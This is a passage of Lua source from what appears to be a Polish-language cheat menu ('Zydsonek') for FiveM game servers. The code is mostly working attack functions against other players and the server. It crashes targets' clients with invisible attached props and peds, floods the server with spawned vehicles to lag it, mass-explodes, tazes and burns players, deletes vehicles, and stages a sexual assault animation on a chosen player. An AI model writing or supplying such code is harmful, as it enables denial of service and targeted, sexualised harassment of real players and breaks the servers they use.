        ZYD:EquipOutfit({
            model = ZYD:GetFunction("GetEntityModel")(ped),
            hat = ZYD:GetFunction("GetPedPropIndex")(ped, 0),
            hat_texture = ZYD:GetFunction("GetPedPropTextureIndex")(ped, 0),
            glasses = ZYD:GetFunction("GetPedPropIndex")(ped, 1),
            glasses_texture = ZYD:GetFunction("GetPedPropTextureIndex")(ped, 1),
            ear = ZYD:GetFunction("GetPedPropIndex")(ped, 2),
            ear_texture = ZYD:GetFunction("GetPedPropTextureIndex")(ped, 2),
            watch = ZYD:GetFunction("GetPedPropIndex")(ped, 6),
            watch_texture = ZYD:GetFunction("GetPedPropTextureIndex")(ped, 6),
            wrist = ZYD:GetFunction("GetPedPropIndex")(ped, 7),
            wrist_texture = ZYD:GetFunction("GetPedPropTextureIndex")(ped, 3),
            head = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 0),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 0),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 0)
            },
            beard = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 1),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 1),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 1)
            },
            hair = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 2),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 2),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 2)
            },
            torso = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 3),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 3),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 3)
            },
            legs = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 4),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 4),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 4)
            },
            hands = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 5),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 5),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 5)
            },
            feet = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 6),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 6),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 6)
            },
            accessory_1 = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 7),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 7),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 7)
            },
            accessory_2 = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 8),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 8),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 8)
            },
            accessory_3 = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 9),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 9),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 9)
            },
            mask = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 10),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 10),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 10)
            },
            auxillary = {
                draw = ZYD:GetFunction("GetPedDrawableVariation")(ped, 11),
                texture = ZYD:GetFunction("GetPedTextureVariation")(ped, 11),
                palette = ZYD:GetFunction("GetPedPaletteVariation")(ped, 11)
            }
        })
    end

    function ZYD:RequestModelSync(model, timeout)
        timeout = timeout or 2500
        local counter = 0
        ZYD:GetFunction("RequestModel")(model)

        while not ZYD:GetFunction("HasModelLoaded")(model) do
            ZYD:GetFunction("RequestModel")(model)
            counter = counter + 100
            Wait(100)
            if counter >= timeout then return false end
        end

        return true
    end

    function ZYD.Util:ValidPlayer(src)
        if not src then return false end

        return ZYD:GetFunction("GetPlayerServerId")(src) ~= nil and ZYD:GetFunction("GetPlayerServerId")(src) > 0
    end

    function ZYD:SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
        CreateThread(function()
            local speed = 0
            local rpm = 0

            if ZYD:GetFunction("IsModelValid")(modelName) and ZYD:GetFunction("IsModelAVehicle")(modelName) then
                ZYD:GetFunction("RequestModel")(modelName)

                while not ZYD:GetFunction("HasModelLoaded")(modelName) do
                    Wait(0)
                end

                local pos = (spawnInside and ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) or ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 4.0, 0.0))
                local heading = ZYD:GetFunction("GetEntityHeading")(ZYD:GetFunction("PlayerPedId")()) + (spawnInside and 0 or 90)
                local vehicle = ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetHashKey")(modelName), pos.x, pos.y, pos.z, heading, true, false)
                ZYD:GetFunction("SetPedIntoVehicle")(ZYD:GetFunction("PlayerPedId")(), vehicle, -1)
                ZYD:GetFunction("SetVehicleEngineOn")(vehicle, true, true)
                ZYD:GetFunction("SetVehicleForwardSpeed")(vehicle, speed)
                ZYD:GetFunction("SetVehicleCurrentRpm")(vehicle, rpm)
            end
        end)
    end

    local _text_input

    function ZYD:DrawTextInput()
        if not _text_input or _text_input == "" then return end
        ZYD.Painter:DrawText(_text_input, 4, false, self:ScrW() / 3.25, self:ScrH() / 2.7, 0.4, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
    end

    function ZYD:GetTextInput(TextEntry, ExampleText, MaxStringLength)
        _text_input = TextEntry .. " (DO NOT PRESS ESCAPE / RMB)"
        ZYD:GetFunction("DisplayOnscreenKeyboard")(1, "", "", ExampleText, "", "", "", MaxStringLength)
        blockinput = true

        while ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 do
            if ZYD.Showing then
                ZYD:DrawMenu()
            end

            self:DrawTextInput()
            Wait(0)
        end

        if ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then
            if ZYD.Showing then
                ZYD:DrawMenu()
            end

            _text_input = nil
            local result = ZYD:GetFunction("GetOnscreenKeyboardResult")()
            blockinput = false
            ZYD:GetFunction("CancelOnscreenKeyboard")()

            return result
        else
            if ZYD.Showing then
                ZYD:DrawMenu()
            end

            _text_input = nil
            blockinput = false
            ZYD:GetFunction("CancelOnscreenKeyboard")()

            return nil
        end
    end

    function ZYD.Util:DeleteEntity(entity)
        if not ZYD:GetFunction("DoesEntityExist")(entity) then return end
        ZYD:GetFunction("NetworkRequestControlOfEntity")(entity)
        ZYD:GetFunction("SetEntityAsMissionEntity")(entity, true, true)
        ZYD:GetFunction("DeletePed")(entity)
        ZYD:GetFunction("DeleteEntity")(entity)
        ZYD:GetFunction("DeleteObject")(entity)
        ZYD:GetFunction("DeleteVehicle")(entity)
    end

    local sounds = {
        ["INFO"] = {
            times = 3,
            name = "DELETE",
            dict = "HUD_DEATHMATCH_SOUNDSET"
        },
        ["WARN"] = {
            times = 1,
            name = "Turn",
            dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS"
        },
        ["ERROR"] = {
            times = 3,
            name = "Hack_Failed",
            dict = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"
        }
    }

    local last_sound = 0

    function ZYD:AddNotification(type, msg, timeout)
        timeout = timeout or 10000

        if ZYD.Config.UseSounds and last_sound <= ZYD:GetFunction("GetGameTimer")() then
            local sound = sounds[type] or {}

            for i = 1, sound.times or 1 do
                if sound.name and sound.dict then
                    ZYD:GetFunction("PlaySoundFrontend")(-1, sound.name, sound.dict, false)
                end
            end

            last_sound = ZYD:GetFunction("GetGameTimer")() + 200
        end

        for _, v in dict.ipairs(self.Notifications) do
            if (v.RawMsg or v.Message) == msg and not self.Notifications[_ + 1] then
                v.Count = (v.Count or 1) + 1
                v.RawMsg = v.RawMsg or v.Message
                v.Message = v.RawMsg .. " ~w~(x" .. v.Count .. ")"
                v.Duration = (timeout / 1000)
                v.Expires = ZYD:GetFunction("GetGameTimer")() + timeout

                return
            end
        end

        local notification = {}
        notification.Type = type
        notification.Message = msg
        notification.Duration = timeout / 1000
        notification.Expires = ZYD:GetFunction("GetGameTimer")() + timeout

        self.Notifications[#self.Notifications + 1] = notification
        ZYD:Print("[" .. type .. "]" .. ": " .. msg)
    end

    function ZYD:DoNetwork(obj)
        if not ZYD:GetFunction("DoesEntityExist")(obj) then return end
        local id = ZYD:GetFunction("ObjToNet")(obj)
        ZYD:GetFunction("NetworkSetNetworkIdDynamic")(id, true)
        ZYD:GetFunction("SetNetworkIdExistsOnAllMachines")(id, true)
        ZYD:GetFunction("SetNetworkIdCanMigrate")(id, false)

        for _, src in dict.pairs(ZYD.PlayerCache) do
            ZYD:GetFunction("SetNetworkIdSyncToPlayer")(id, src, true)
        end
    end

    function ZYD:GasPlayer(player)
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            local ped = ZYD:GetFunction("GetPlayerPed")(player)
            if not ZYD:GetFunction("DoesEntityExist")(ped) then return end
            ZYD:GetFunction("ClearPedTasksImmediately")(ped)
            local dest = ZYD:GetFunction("GetPedBoneCoords")(ped, ZYD:GetFunction("GetPedBoneIndex")(ped, 0), 0.0, 0.0, 0.0, 0.0)
            local origin = ZYD:GetFunction("GetPedBoneCoords")(ped, ZYD:GetFunction("GetPedBoneIndex")(ped, 57005), 0.0, 0.0, 0.0, 0.0)

            for i = 1, 5 do
                ZYD:GetFunction("AddExplosion")(origin.x + dict.math.random(-1, 1), origin.y + dict.math.random(-1, 1), origin.z - 1.0, 12, 100.0, true, false, 0.0)
                Wait(10)
            end

            local pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
            local fence_u = ZYD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
            ZYD:DoNetwork(fence_u)
            ZYD:GetFunction("SetEntityRotation")(fence_u, 0.0, 0.0, 0.0)
            ZYD:GetFunction("FreezeEntityPosition")(fence_u, true)
            Wait(10)
            local fence_r = ZYD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
            ZYD:DoNetwork(fence_r)
            ZYD:GetFunction("SetEntityRotation")(fence_r, 0.0, 0.0, 90.0)
            ZYD:GetFunction("FreezeEntityPosition")(fence_r, true)
            Wait(10)
            local fence_b = ZYD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y + 1.85, pos.z - 1.0, true, true, true)
            ZYD:DoNetwork(fence_b)
            ZYD:GetFunction("SetEntityRotation")(fence_b, 0.0, 0.0, 0.0)
            ZYD:GetFunction("FreezeEntityPosition")(fence_b, true)
            local fence_l = ZYD:GetFunction("CreateObject")(-759902142, pos.x + 1.35, pos.y - 1.0, pos.z - 1.0, true, true, true)
            ZYD:DoNetwork(fence_l)
            ZYD:GetFunction("SetEntityRotation")(fence_l, 0.0, 0.0, 90.0)
            ZYD:GetFunction("FreezeEntityPosition")(fence_l, true)
        end)
    end

    function ZYD:TazePlayer(player)
        local ped = ZYD:GetFunction("GetPlayerPed")(player)
        local destination = ZYD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
        local origin = ZYD:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
        ZYD:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, ZYD:GetFunction("GetHashKey")("WEAPON_STUNGUN"), ZYD:GetFunction("PlayerPedId")(), true, false, 24000.0)
    end

    function ZYD:HydrantPlayer(player)
        local ped = ZYD:GetFunction("GetPlayerPed")(player)
        local origin = ZYD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
        ZYD:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 13, 100.0, (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
    end

    function ZYD:FirePlayer(player)
        local ped = ZYD:GetFunction("GetPlayerPed")(player)
        local origin = ZYD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
        ZYD:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 12, 100.0, (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
    end

    local crash_model_list = {}
    local crash_models = {"hei_prop_carrier_cargo_02a", "p_cablecar_s", "p_ferris_car_01", "prop_cj_big_boat", "prop_rock_4_big2", "prop_steps_big_01", "v_ilev_lest_bigscreen", "prop_carcreeper", "apa_mp_h_bed_double_09", "apa_mp_h_bed_wide_05", "sanchez", "cargobob", "prop_cattlecrush", "prop_cs_documents_01"} --{"prop_ferris_car_01_lod1", "prop_construcionlamp_01", "prop_fncconstruc_01d", "prop_fncconstruc_02a", "p_dock_crane_cabl_s", "prop_dock_crane_01", "prop_dock_crane_02_cab", "prop_dock_float_1", "prop_dock_crane_lift", "apa_mp_h_bed_wide_05", "apa_mp_h_bed_double_08", "apa_mp_h_bed_double_09", "csx_seabed_bldr4_", "imp_prop_impexp_sofabed_01a", "apa_mp_h_yacht_bed_01"}

    CreateThread(function()
        ZYD:RequestModelSync(spike_model)

        local loaded = 0

        for i = 1, #crash_models do
            if ZYD:RequestModelSync(crash_models[i]) then
                loaded = loaded + 1
            end
        end

        for i = 1, #crash_models * 5 do
            for _ = 1, 2 do
                table.insert(crash_models, crash_models[dict.math.random(1, #crash_models)])
                loaded = loaded + 1
            end
        end

        ZYD:Print(" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print (" ")
		print ("[Zydsonek] Zexecutowano menu")
    end)

    local crash_loop
    local notified_crash = {}

    function ZYD:CrashPlayer(player, all, strict)
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end
        local ATT_LIMIT = 400
        local CUR_ATT_COUNT = 0

        CreateThread(function()
            local ped = ZYD:GetFunction("GetPlayerPed")(player)
            local playerPos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
            local selfPos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
            local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(playerPos.x, playerPos.y, playerPos.z, selfPos.x, selfPos.y, selfPos.z, true)

            if dist <= 500.0 then
                local safeX, safeY, safeZ = playerPos.x - dict.math.random(-1000, 1000), playerPos.y - dict.math.random(-1000, 1000), -200
                ZYD:GetFunction("SetEntityCoords")(ZYD:GetFunction("PlayerPedId")(), _clamp(safeX, -2000, 2000) + 0.0, _clamp(safeY, -2000, 2000) + 0.0, safeZ)
            end

            ZYD:AddNotification("INFO", "Zcrashowano " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(player)), 10000)
            local bad_obj

            for i = 1, ATT_LIMIT do
                if CUR_ATT_COUNT >= ATT_LIMIT or not ZYD:GetFunction("DoesEntityExist")(ped) then break end
                local method = dict.math.random(1, 2)

                if strict == "object" then
                    method = 1
                elseif strict == "ped" then
                    method = 2
                end

                if method == 1 then
                    local model = crash_models[dict.math.random(1, #crash_models)]
                    local obj = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, true, true, true)

                    if not ZYD:GetFunction("DoesEntityExist")(obj) then
                        bad_obj = true

                        if not notified_crash[model] then
                            ZYD:Print("[CRASH] Failed to load object ^3" .. model .. "^7")
                            notified_crash[model] = true
                        end
                    else
                        ZYD:DoNetwork(obj)
                        ZYD:GetFunction("AttachEntityToEntity")(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
                        ZYD:GetFunction("SetEntityVisible")(obj, false)
                        crash_model_list[obj] = true
                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1
                    end
                elseif method == 2 then
                    local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]
                    local ent = ZYD:GetFunction("CreatePed")(24, ZYD:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, 0.0, true, true)

                    if ZYD:GetFunction("DoesEntityExist")(ent) then
                        ZYD:DoNetwork(ent)
                        ZYD:GetFunction("AttachEntityToEntity")(ent, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, 1, false)
                        ZYD:GetFunction("SetEntityVisible")(ent, false)
                        crash_model_list[ent] = true
                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1
                    end
                end

                Wait(0)
            end

            if bad_obj then
                self:AddNotification("ERROR", "Some crash models failed to load. See console for details.", 10000)
            end

            notified_crash = {}
            ZYD:CleanupCrash(player, all)
        end)
    end

    function ZYD:CleanupCrash(player, all)
        CreateThread(function()
            if crash_loop ~= nil and not all then return end
            crash_loop = not all and player or nil

            if crash_loop and not ZYD:GetFunction("DoesEntityExist")(crash_loop) then
                crash_loop = nil
            end

            local timeout = 0

            while (all and timeout <= 180000) or (ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(crash_loop)) and timeout <= 120000) do
                timeout = timeout + 100
                Wait(100)
            end

            while true do
                if not ZYD.Enabled then return end

                for cobj, _ in dict.pairs(crash_model_list) do
                    if ZYD:RequestControlSync(cobj) then
                        ZYD:GetFunction("DeleteObject")(cobj)
                        ZYD:GetFunction("DeleteEntity")(cobj)
                        crash_model_list[cobj] = nil
                    end
                end

                if #crash_model_list == 0 then
                    ZYD:AddNotification("INFO", "Wyczyszczono crashujace propy")
                    crash_loop = nil

                    return
                else
                    ZYD:AddNotification("ERROR", "Nie wyczyszczono " .. #crash_model_list .. " crash object" .. (#crash_model_list ~= 1 and "s" or "") .. ". Sprobuj za 5 sekund")
                    Wait(5000)
                end
            end
        end)
    end

    function ZYD:RapePlayer(player)
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]
            ZYD:RequestModelSync(model)
            ZYD:GetFunction("RequestAnimDict")("rcmpaparazzo_2")

            while not ZYD:GetFunction("HasAnimDictLoaded")("rcmpaparazzo_2") do
                Wait(0)
            end

            if ZYD:GetFunction("IsPedInAnyVehicle")(ZYD:GetFunction("GetPlayerPed")(player), true) then
                local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("GetPlayerPed")(player), true)
                ZYD:GetFunction("ClearPedTasksImmediately")(ZYD:GetFunction("GetPlayerPed")(player))
                while not ZYD:GetFunction("NetworkHasControlOfEntity")(veh) do
                    ZYD:GetFunction("NetworkRequestControlOfEntity")(veh)
                    Wait(0)
                end

                ZYD:GetFunction("SetEntityAsMissionEntity")(veh, true, true)
                ZYD:GetFunction("DeleteVehicle")(veh)
                ZYD:GetFunction("DeleteEntity")(veh)
            end

            local count = -0.2

            for _ = 1, 3 do
                local c = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(player), 0.0, 0.0, 0.0)
                local x, y, z = c.x, c.y, c.z
                local rape_ped = ZYD:GetFunction("CreatePed")(4, ZYD:GetFunction("GetHashKey")(model), x, y, z, 0.0, true, false)
                ZYD:GetFunction("SetEntityAsMissionEntity")(rape_ped, true, true)
                ZYD:GetFunction("AttachEntityToEntity")(rape_ped, ZYD:GetFunction("GetPlayerPed")(player), 4103, 11816, count, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("GetPlayerPed")(player))
                ZYD:GetFunction("TaskPlayAnim")(ZYD:GetFunction("GetPlayerPed")(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                ZYD:GetFunction("SetPedKeepTask")(rape_ped)
                ZYD:GetFunction("SetPedAlertness")(rape_ped, 0.0)
                ZYD:GetFunction("TaskPlayAnim")(rape_ped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                ZYD:GetFunction("SetEntityInvincible")(rape_ped, true)
                count = count - 0.4
            end
        end)
    end

    local car_spam = {"Airtug", "Alpha", "Akuma", "Feltzer", "Felon", "Faggio", "Ambulance", "Asea", "Blista", "Baller", "Futo", "Fusilade", "Granger", "Guantlet", "Glendale", "Benson", "Blazer", "Biff", "Gresley", "Graintrailer", "Hexer", "Brawler", "Boxville", "Interceptor", "Intruder", "Issi", "Burrito", "Buzzard", "Bullet", "Bufallo", "Jackal", "Jester", "Jet", "Journey", "Bus", "Kraken", "Kalahari", "Caddy", "Camper", "Landstalker", "Cutter", "Crusader", "Mallard", "Mammatus", "Manana", "Marshall", "Massacro", "Maverick", "Mesa", "Monroe", "Mixer", "Mower", "Miljet", "Minivan", "Cargobob", "Coquette", "Comet", "Chino", "Cheetah", "Cruiser", "Crane", "Cuban", "Oracle", "Osiris", "Lazer", "Tug", "Patriot", "Octopus", "Packer", "Panto", "Paradise", "Ranger", "Dinghy", "Dignity", "Dashound", "Dubsta", "--CUSTOMOWE AUTA--", "a45", "a45amg", "amggtr", "amggts", "aperta", "divo", "brabus550", "brabus850", "h6", "gtr", "i8", "m2", "macan", "p1", "rs3", "rs7", "s63", "20trailboss", "sq7", "srt8", "20chevy", "18raptor", "20trailboss", "488gtb", "500gtr", "18charger", "amgs63", "C8"}

    function ZYD:CarSpamServer()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            for _, hash in dict.ipairs(car_spam) do
                self:RequestModelSync(hash)

                for _, src in dict.pairs(ZYD.PlayerCache) do
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        local ped = ZYD:GetFunction("GetPlayerPed")(src)
                        local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                        ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, ZYD:GetFunction("GetEntityHeading")(ped), true, false)
                    end

                    Wait(5)
                end

                Wait(5)
            end
        end)
    end

    local _use_lag_server
    local _use_hydrant_loop
    local _use_fire_loop
    local _use_taze_loop
    local _use_delete_loop
    local _use_explode_vehicle_loop
    local _use_explode_player_loop
    local _use_launch_loop

    function ZYD:LaggingServer()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_lag_server do
                for _, hash in dict.ipairs(car_spam) do
                    self:RequestModelSync(hash)

                    for _, src in dict.pairs(ZYD.PlayerCache) do
                        src = dict.tonumber(src)

                        if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                            local ped = ZYD:GetFunction("GetPlayerPed")(src)
                            local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                            ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, ZYD:GetFunction("GetEntityHeading")(ped), true, false)
                        end

                        Wait(5)
                    end

                    Wait(5)
                end

                Wait(20)
            end
        end)
    end

    function ZYD:HydrantLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_hydrant_loop do
                for _, src in dict.pairs(ZYD.PlayerCache) do
                    if not _use_hydrant_loop then break end
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        ZYD:HydrantPlayer(src)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:FireLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_fire_loop do
                for _, src in dict.pairs(ZYD.PlayerCache) do
                    if not _use_fire_loop then break end
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        ZYD:FirePlayer(src)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:TazeLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_taze_loop do
                for _, src in dict.pairs(ZYD.PlayerCache) do
                    if not _use_taze_loop then break end
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        ZYD:TazePlayer(src)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:DeleteLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_delete_loop do
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                for veh in ZYD:EnumerateVehicles() do
                    if not _use_delete_loop then break end

                    if veh ~= _veh or ZYD.Config.OnlineIncludeSelf then
                        ZYD.Util:DeleteEntity(veh)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:ExplodeVehicleLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_explode_vehicle_loop do
                local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

                for veh in ZYD:EnumerateVehicles() do
                    if not _use_explode_vehicle_loop then break end

                    if veh ~= _veh or ZYD.Config.OnlineIncludeSelf then
                        ZYD:GetFunction("NetworkExplodeVehicle")(veh, true, false, false)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:ExplodePlayerLoop()
        if ZYD.Config.SafeMode then return ZYD:AddNotification("WARN", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.") end

        CreateThread(function()
            while _use_explode_player_loop do
                for _, src in dict.pairs(ZYD.PlayerCache) do
                    if not _use_explode_player_loop then break end
                    src = dict.tonumber(src)

                    if src ~= PlayerId() or ZYD.Config.OnlineIncludeSelf then
                        ZYD:GetFunction("AddExplosion")(ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                    end

                    Wait(1)
                end

                Wait(5)
            end
        end)
    end

    function ZYD:SpawnPed(where, heading, model, weapon)
        if not ZYD:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.", 2500) end
        local ped = ZYD:GetFunction("CreatePed")(4, ZYD:GetFunction("GetHashKey")(model), where.x, where.y, where.z, heading or 0.0, true, true)
        ZYD:GetFunction("SetNetworkIdCanMigrate")(ZYD:GetFunction("NetworkGetNetworkIdFromEntity")(ped), true)
        ZYD:GetFunction("NetworkSetNetworkIdDynamic")(ZYD:GetFunction("NetworkGetNetworkIdFromEntity")(ped), false)

        if weapon then
            ZYD:GetFunction("GiveWeaponToPed")(ped, ZYD:GetFunction("GetHashKey")(weapon), 9000, false, true)
        end

        ZYD:GetFunction("SetPedAccuracy")(ped, 100)

        return ped
    end

    function ZYD:UnlockVehicle(veh)
        if not ZYD:GetFunction("DoesEntityExist")(veh) or not ZYD:GetFunction("IsEntityAVehicle")(veh) then return end
        if not ZYD:RequestControlSync(veh) then return ZYD:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
        ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
        ZYD:GetFunction("SetVehicleDoorsLockedForPlayer")(veh, PlayerId(), false)
        ZYD:GetFunction("SetVehicleDoorsLocked")(veh, false)
        ZYD:AddNotification("Udane", "Samochod odblokowany.", 5000)
    end

    function ZYD:DisableVehicle(veh)
        if not ZYD:GetFunction("DoesEntityExist")(veh) or not ZYD:GetFunction("IsEntityAVehicle")(veh) then return end
